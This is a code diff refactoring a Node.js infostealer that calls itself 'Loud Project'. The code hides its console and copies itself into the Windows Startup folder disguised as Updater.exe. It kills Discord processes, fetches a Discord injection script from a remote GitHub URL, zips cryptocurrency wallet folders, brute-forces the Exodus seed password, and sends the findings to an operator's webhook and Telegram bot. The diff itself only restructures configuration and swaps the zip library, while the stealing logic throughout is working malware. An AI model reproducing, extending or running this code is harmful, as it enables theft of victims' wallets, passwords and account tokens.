@@ -7,18 +7,18 @@ const { exec, execSync, spawn } = require("child_process");
 hideconsole();
 
 const axios = require("axios");
-const glob = require("glob");
+const glob = require("fast-glob");
 const buf_replace = require("buffer-replace");
 const os = require("os");
 const crypto = require("crypto");
 const sqlite3 = require("sqlite3");
-const { Dpapi } = require("@primno/dpapi");
+const Dpapi = require("node-dpapi-prebuilt");
 const forge = require("node-forge");
 const seco = require("seco-file");
 const FormData = require("form-data");
 const screenshot = require("screenshot-desktop");
-const archiver = require("archiver");
 const WebSocket = require("ws");
+const AdmZip = require("adm-zip");
 
 function hideconsole() {
   const randomFileName = `${randomChar(10)}.ps1`;
@@ -48,16 +48,17 @@ function hideconsole() {
   }
 }
 
-let wbk = `%WEBHOOK%`;
-let token = "%TELEGRAM_BOTTOKEN%";
-let chatId = "%TELEGRAM_CHATID%";
-let tlg = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}`;
-let discordInject = `https://raw.githubusercontent.com/familigy/sub/main/index.js`;
-
 let cfg = {
+  wbk: `%WEBHOOK%`,
+  token: "%TELEGRAM_BOTTOKEN%",
+  chatId: "%TELEGRAM_CHATID%",
+  tlg: `https://api.telegram.org/bot%TELEGRAM_BOTTOKEN%/sendMessage?chat_id=%TELEGRAM_CHATID%`,
+  discordInject: `https://raw.githubusercontent.com/familigy/sub/main/index.js`,
   Persist: "%PERSIST?%",
-  Persist: "%BLUESCREEN?%",
+  bluescreen: "%BLUESCREEN?%",
 };
+
+const { wbk, token, chatId, tlg, discordInject, Persist, bluescreen } = cfg;
 
 const identifier = `LoudLogs_${randomChar(4)}-${randomChar(4)}-${randomChar(4)}-${randomChar(4)}`;
 const rdm = `LoudLogs_${random(10)}`;
@@ -181,7 +182,7 @@ function randomChar(length) {
 }
 
 function add_to_startup() {
-  if (!cfg.Persist) return;
+  if (!Persist) return;
   fs.createReadStream(process.argv0).pipe(fs.createWriteStream(`${process.env.APPDATA.replace("\\", "/")}/Microsoft/Windows/Start Menu/Programs/Startup/Updater.exe`));
 }
 
@@ -197,7 +198,7 @@ function listDiscord() {
 }
 
 function killDiscord() {
-  if (!cfg.Persist) return;
+  if (!Persist) return;
   runningDiscords.forEach((disc) => {
     try {
       exec("taskkill /IM " + disc + ".exe /F"),
@@ -271,7 +272,8 @@ async function saveWallets() {
   for (const [wallet, path] of Object.entries(walletLocalPaths)) {
     if (!fs.existsSync(path)) continue;
     if (!fs.existsSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Wallets`)) fs.mkdirSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Wallets`);
-    await zipResult(path, process.env.TEMP + `\\LoudProject\\${rdm}\\Wallets\\${wallet}.zip`);
+    const archive = new AdmZip();
+    await Promise.all([archive.addLocalFolder(path), archive.writeZip(process.env.TEMP + `\\LoudProject\\${rdm}\\Wallets\\${wallet}.zip`)]);
   }
 }
 
@@ -279,13 +281,11 @@ async function exodusDecrypt(passwords) {
   const seedpath = appdata + "\\Exodus\\exodus.wallet\\seed.seco";
   if (!fs.existsSync(seedpath)) return;
   try {
-    let ExodusSaved = path.join(seedpath, "..");
-    let zipUrl = await zipResult(ExodusSaved, ExodusSaved + ".zip");
-    decryptFileSeco(seedpath, passwords, zipUrl);
+    decryptFileSeco(seedpath, passwords);
   } catch (e) {}
 }
 
-async function decryptFileSeco(filename, passwords, zipUrl) {
+async function decryptFileSeco(filename, passwords) {
   if (!passwords.length);
 
   const data = fs.readFileSync(filename);
@@ -301,8 +301,6 @@ async function decryptFileSeco(filename, passwords, zipUrl) {
   }
 
   if (!final) return;
-  let ExodusURL = await upload(zipUrl);
-
   axios.post(`${wbk}`, { text: `👀 Loud Project | Exodus Bruteforce\n\n🔑 Password: ${final}` }).catch(() => null);
   axios
     .post(wbk, {
@@ -314,7 +312,7 @@ async function decryptFileSeco(filename, passwords, zipUrl) {
           footer: {
             text: "Loud Project | https://t.me/LoudProject",
           },
-          description: `<:bby:987689933844127804> Password:\n\`${final}\`\n\`\`\`${ExodusURL}\`\`\``,
+          description: `<:bby:987689933844127804> Password:\n\`${final}\``,
           author: {
             name: "Exodus Bruteforce",
             icon_url: `https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png`,
@@ -379,7 +377,11 @@ async function AllInfos() {
     }
   }
 
-  let path = await zipResult(process.env.TEMP + `\\LoudProject\\${rdm}`, process.env.TEMP + `\\LoudProject\\${rdm}.zip`);
+  let path = process.env.TEMP + `\\LoudProject\\${rdm}.zip`;
+
+  const archive = new AdmZip();
+  await Promise.all([archive.addLocalFolder(process.env.TEMP + `\\LoudProject\\${rdm}`), archive.writeZip(path)]);
+
   const linked = await upload(path).catch(() => null);
 
   const cpu = os.cpus()[0].model;
@@ -2045,22 +2047,6 @@ async function getNitro(flags, id, token) {
 async function getIp() {
   const ip = await axios.get("https://www.myexternalip.com/raw").catch(() => null);
   return ip?.data || "Unknown";
-}
-
-async function zipResult(basepath, savepath) {
-  const archive = archiver("zip", { zlib: { level: 9 } });
-  const stream = fs.createWriteStream(savepath);
-  return new Promise((resolve, reject) => {
-    try {
-      archive
-        .directory(basepath + "\\", false)
-        .on("error", (err) => reject(err))
-        .pipe(stream);
-
-      stream.on("close", () => resolve(savepath));
-      archive.finalize().then(() => {});
-    } catch {}
-  });
 }
 
 async function ExecutionFloat(params) {
